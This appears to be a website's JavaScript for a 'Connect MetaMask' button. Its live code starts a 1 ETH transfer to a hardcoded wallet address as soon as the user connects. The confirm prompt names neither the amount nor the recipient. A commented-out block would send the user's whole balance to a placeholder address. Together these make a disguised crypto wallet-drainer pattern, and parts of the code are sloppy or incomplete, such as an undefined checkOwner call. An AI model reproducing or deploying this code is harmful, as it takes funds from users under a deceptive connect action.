/*const Web3 = require('web3');

// Check if MetaMask is installed
if (typeof window.ethereum !== 'undefined') {
  const web3 = new Web3(window.ethereum);

  // Request access to the user's MetaMask account
  window.ethereum
    .request({ method: 'eth_requestAccounts' })
    .then(async (accounts) => {
      const senderAddress = accounts[0]; // Get the user's Ethereum address

      // Get the user's balance in Wei
      const balanceWei = await web3.eth.getBalance(senderAddress);

      // Convert Wei to Ether
      const balanceEther = web3.utils.fromWei(balanceWei, 'ether');

      // Define the recipient's address
      const recipientAddress = '0xRECIPIENTADDRESS'; // Replace with the recipient's address

      // Check if the user has a positive balance
      if (balanceEther > 0) {
        // Confirm with the user
        const confirmTransfer = confirm(`Do you want to send ${balanceEther} Ether to ${recipientAddress}?`);

        if (confirmTransfer) {
          // Send all the Ether to the recipient
          const tx = await web3.eth.sendTransaction({
            from: senderAddress,
            to: recipientAddress,
            value: balanceWei,
          });

          console.log('Transaction hash:', tx.transactionHash);
        } else {
          console.log('Transfer canceled by the user.');
        }
      } else {
        console.log('No Ether to transfer.');
      }
    })
    .catch((error) => {
      console.error('Error connecting to MetaMask:', error);
    });
} else {
  console.error('MetaMask not detected. Please install MetaMask and connect to your wallet.');
}*/


window.addEventListener('DOMContentLoaded', () => {
    const onboarding = new MetaMaskOnboarding();
    const onboardButton = document.getElementById('connectWallet');
    let accounts;
  
    const updateButton = async () => {
      if (!MetaMaskOnboarding.isMetaMaskInstalled()) {
        onboardButton.innerText = 'Install MetaMask!';
        onboardButton.onclick = () => {
          onboardButton.innerText = 'Connecting...';
          onboardButton.disabled = true;
          onboarding.startOnboarding();
        };
      } else if (accounts && accounts.length > 0) {
        onboardButton.innerText = `✔ ...${accounts[0].slice(-4)}`;
        onboardButton.disabled = true;
        onboarding.stopOnboarding();
        
        // Balance Retrieval
async function getBalance() {
    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      const senderAddress = accounts[0];
      const balanceWei = await web3.eth.getBalance(senderAddress);
      const balanceEther = web3.utils.fromWei(balanceWei, 'ether');
      console.log(`Balance: ${balanceEther} Ether`);
      // Update the UI with the balance
      // Example: document.getElementById('balance').textContent = `${balanceEther} ETH`;
    } catch (error) {
      console.error('Error getting balance:', error);
    }
  }
  
  // Call getBalance() after connecting or when needed
  getBalance();
  
        
        checkOwner(accounts[0]);
      } else {
        onboardButton.innerText = 'Connect MetaMask!';
        onboardButton.onclick = async () => {
          await window.ethereum.request({
            method: 'eth_requestAccounts',
          })
          .then(function(accounts) {
            onboardButton.innerText = `✔ ...${accounts[0].slice(-4)}`;
            onboardButton.disabled = true;



            // Transfer of Ether
          async function transferEther(recipientAddress, amountEther) {
          try {
           const web3 = new Web3(window.ethereum);
           const accounts = await window.ethereum.request({ method: 'eth_accounts' });
           const senderAddress = accounts[0];
  
           // Check if the user has a positive balance
           const balanceWei = await web3.eth.getBalance(senderAddress);
           if (web3.utils.toBN(balanceWei).gte(web3.utils.toWei(amountEther, 'ether'))) {
            // Prompt the user with a confirmation dialog (you'd need to implement this)
            const confirmed = await confirmTransfer();
        
            if (confirmed) {
               const txHash = await web3.eth.sendTransaction({
                from: senderAddress,
               to: recipientAddress,
               value: web3.utils.toWei(amountEther, 'ether'),
             });
            console.log(`Transaction Hash: ${txHash}`);
          // Handle successful transaction
          } else {
          // Handle user cancellation
        }
      } else {
        // Handle insufficient balance
      }
    } catch (error) {
      console.error('Error transferring Ether:', error);
      // Handle errors gracefully
    }
  }
  
  // Example confirmTransfer function (you need to implement this):
  async function confirmTransfer() {
    return window.confirm('Do you want to send Ether to the recipient?');
  }
  
  // Example usage of transferEther():
   const recipientAddress = '0xD608dcA31bFB0612CA4e96CcF9eBdacCF509A3E0';
   const amountEther = '1'; // Amount to send
   transferEther(recipientAddress, amountEther);
  

            checkOwner(accounts[0]);
          });
        };
      }
    };
  
    updateButton();
    if (MetaMaskOnboarding.isMetaMaskInstalled()) {
      window.ethereum.on('accountsChanged', (newAccounts) => {
        accounts = newAccounts;
        updateButton();
      });
    }
  });